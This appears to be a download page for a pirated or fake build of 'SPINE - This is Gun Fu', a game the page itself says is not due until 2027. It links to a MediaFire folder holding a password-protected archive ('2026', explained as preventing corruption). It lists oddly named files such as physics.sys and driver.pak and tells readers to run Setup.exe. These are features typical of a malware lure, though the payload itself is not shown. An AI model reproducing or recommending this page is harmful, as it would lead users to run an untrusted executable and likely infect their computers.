## 🕹️ About

SPINE - This is Gun Fu is a single-player cinematic action game developed and published by Nekki. Set in the cyberpunk megacity of Tensor City, it follows rebellious street artist Redline and her sentient combat implant, Spine, as they challenge an autocratic AI regime while searching for her captured brother. The core loop combines close-quarters gunplay, beat-'em-up combat, dodges, parries, disarms, environmental attacks, and cinematic finishers across a linear, mission-based story. The game is currently planned for release on PC and consoles in 2027. This compact release uses more efficient archive compression to reduce the download size; the game itself is unchanged and contains the same content and gameplay.

SPINE is for players who enjoy stylish single-player action, cinematic gunplay, beat-'em-up combat, and story-driven cyberpunk adventures.

## ✨ Features

- 🥊 **Freeflow Fighting** — Chain attacks, movement, weapons, and environmental opportunities without breaking momentum.
- 🎬 **Cinematic Action** — A close combat camera and expressive animation make every encounter feel like an action film.
- 🔫 **Gun Fu Combat** — Blend firearms, close combat, dodges, parries, disarms, and counters in fluid fights.
- 🌆 **Cyberpunk City** — Fight through Tensor City, a divided megacity ruled by an autocratic artificial intelligence.
- 🧠 **Sentient Implant** — Redline's Spine implant is both a powerful combat tool and a central character in the story.
- 👊 **Boss Encounters** — Face powerful Spine-equipped opponents who demand different approaches.

### Step 1: Download

Download the compact archive from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the build expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- patch_1.bnk <- Audio banks
|-- physics.sys <- Physics engine
|-- update_1.ini <- Update config
|-- animations.dll <- Animation system
|-- license.bank <- License data
|-- uninstall.key <- Uninstall key
|-- license.wem <- Audio assets
|-- localization.ini <- Language files
|-- lang.sys <- Language system
|-- installer.dat <- Installer data
|-- settings.bin <- Configuration
|-- launcher.dll <- Launcher library
|-- audio.res <- Audio resources
|-- global.cfg <- Global settings
|-- update_1.res <- Update resources
|-- assets.wem <- Asset audio
|-- dlc.md5 <- DLC checksums
|-- driver.umap <- Driver data
|-- scripts.lic <- Game scripts
|-- bootstrap.wem <- Bootstrap audio
|-- res.pak <- Resources archive
|-- Password 2026.txt <- Password reminder (empty)
|-- api.pak <- API modules
|-- driver.pak <- Driver archive
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
